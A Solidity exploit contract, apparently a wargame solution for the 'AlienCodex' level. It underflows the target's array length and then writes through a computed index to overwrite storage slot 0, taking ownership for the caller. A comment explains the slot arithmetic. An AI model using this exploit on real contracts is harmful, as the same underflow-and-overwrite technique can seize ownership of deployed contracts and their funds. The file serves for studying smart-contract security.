// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract HackAlientCodex {
    // INTERNAL
    function _makeContact(address _alienCodexContractAddr) internal {
        (bool success, ) = _alienCodexContractAddr.call(
            abi.encodeWithSignature("make_contact()")
        );
        require(success, "HACK FAILED");
    }

    function _retract(address _alienCodexContractAddr) internal {
        (bool success, ) = _alienCodexContractAddr.call(
            abi.encodeWithSignature("retract()")
        );
        require(success, "HACK FAILED");
    }

    function _overwriteOwner(address _alienCodexContractAddr) internal {
        /**
        codex[n] = storageSlot no. { keccak256(1) +  n }
        
        For an arbitrary storage slot no. S,
        keccak256(1) + {(2^256 - keccak256(1)) + 1 + S } would be used to access slot S.
        Comparing, we get n = 2^256 - keccak256(1) + 1 + S

        _owner is at Slot 0
        So, to overwrite slot 0, n = 2^256 - keccak256(1) + 1
         */
        (bool success, ) = _alienCodexContractAddr.call(
            abi.encodeWithSignature(
                "revise(uint256,bytes32)",
                (uint256(-1) - uint256(keccak256(abi.encode(1)))) + uint256(1),
                bytes32(uint256(msg.sender))
            )
        );
        require(success, "HACK FAILED");
    }

    // EXTERNAL
    function hack(address _alienCodexContractAddr) external {
        _makeContact(_alienCodexContractAddr);
        _retract(_alienCodexContractAddr);
        _overwriteOwner(_alienCodexContractAddr);
    }
}